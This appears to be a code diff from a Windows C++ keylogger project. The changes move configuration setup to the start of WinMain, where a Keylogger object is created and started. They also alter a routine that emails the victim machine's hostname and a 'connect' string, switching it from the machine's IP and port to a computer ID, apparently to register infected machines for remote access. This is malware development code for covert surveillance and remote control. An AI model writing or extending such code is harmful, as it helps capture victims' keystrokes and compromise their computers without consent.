@@ -29,6 +29,9 @@ void initAppData();
 
 INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
+
+	Configuration::InitConfiguration();
+
 	// Add console for debug
 #ifdef _DEBUG
 	AllocConsole();
@@ -56,8 +59,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	wndClass.lpszMenuName = NULL;
 	wndClass.lpszClassName = L"window";
 	RegisterClass(&wndClass);
-
-	Configuration::InitConfiguration();
 
 	logger = make_shared<Keylogger>();
 	logger->start();
@@ -189,7 +190,6 @@ void sendFirstEmail() {
 	std::wstringstream bodyStream;
 	bodyStream << ComputerInfoHelper::getInstance()->getHostName() << " connected" << std::endl;
 	bodyStream << "To connect use this string:" << std::endl;
-	bodyStream << "connect " << ComputerInfoHelper::getInstance()->getIp() << " " <<
-		ComputerInfoHelper::getInstance()->getPort();
+	bodyStream << "connect " << AppData::getInstance().ComputerId;
 	emailService->sendEmail(subject, bodyStream.str(), L"", L"");
 }
